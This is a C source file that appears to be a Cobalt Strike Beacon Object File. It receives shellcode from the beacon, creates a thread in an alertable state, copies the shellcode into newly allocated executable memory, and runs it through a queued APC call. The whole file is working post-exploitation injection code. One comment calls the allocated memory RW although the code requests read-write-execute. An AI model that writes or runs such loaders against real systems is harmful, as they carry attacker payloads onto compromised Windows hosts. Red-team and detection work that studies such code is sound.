#include <stdio.h>
#include <windows.h>
#include "../_include/beacon.h"
#include "libc.h"

WINBASEAPI   HANDLE   WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
WINBASEAPI   LPVOID   WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI   BOOL     WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI   DWORD    WINAPI KERNEL32$QueueUserAPC(LPVOID, HANDLE, ULONG_PTR);
WINBASEAPI   VOID     WINAPI KERNEL32$SleepEx(DWORD, BOOL);
WINBASEAPI   DWORD    WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI   DWORD    WINAPI KERNEL32$GetLastError(VOID);

void AlertableFunction() {
    WINAPI KERNEL32$SleepEx(INFINITE, TRUE);
}

void go(char * args, int len) {

    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD dwThreadID = NULL;
    DWORD dwOldProtection = NULL;
    SIZE_T stShellcodeSize = NULL;
    CHAR* shellcode = BeaconDataExtract(&parser, &stShellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Size: %d", stShellcodeSize);

    // Create thread in alertable state
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, AlertableFunction, NULL, 0, &dwThreadID);
    if (!hThread) {
        BeaconPrintf(CALLBACK_OUTPUT, "Thread creation failed with error code %d", KERNEL32$GetLastError());
    }

    // Allocate RW memory
    LPVOID lpShellcodeAddress = KERNEL32$VirtualAlloc(NULL, stShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpShellcodeAddress) {
        BeaconPrintf(CALLBACK_OUTPUT, "Memory allocation failed with error code %d", KERNEL32$GetLastError());
    }

    // Copy buffer to allocated RW memory
    mycopy(lpShellcodeAddress, shellcode, stShellcodeSize);

    // Change shellcode memory from RW to RX
    KERNEL32$VirtualProtect(lpShellcodeAddress, stShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtection);
    if (!dwOldProtection) {
        BeaconPrintf(CALLBACK_OUTPUT, "VirtualProtect failed with error code %d", KERNEL32$GetLastError());
    }

    // Perform APC and trigger shellcode execution
    DWORD dwQUA = KERNEL32$QueueUserAPC(lpShellcodeAddress, hThread, NULL);
    if (!dwQUA) {
        BeaconPrintf(CALLBACK_OUTPUT, "APC failed with error code %d", KERNEL32$GetLastError());
    }

    // Give the thread time to execute the shellcode
    KERNEL32$WaitForSingleObject(hThread, INFINITE);
}
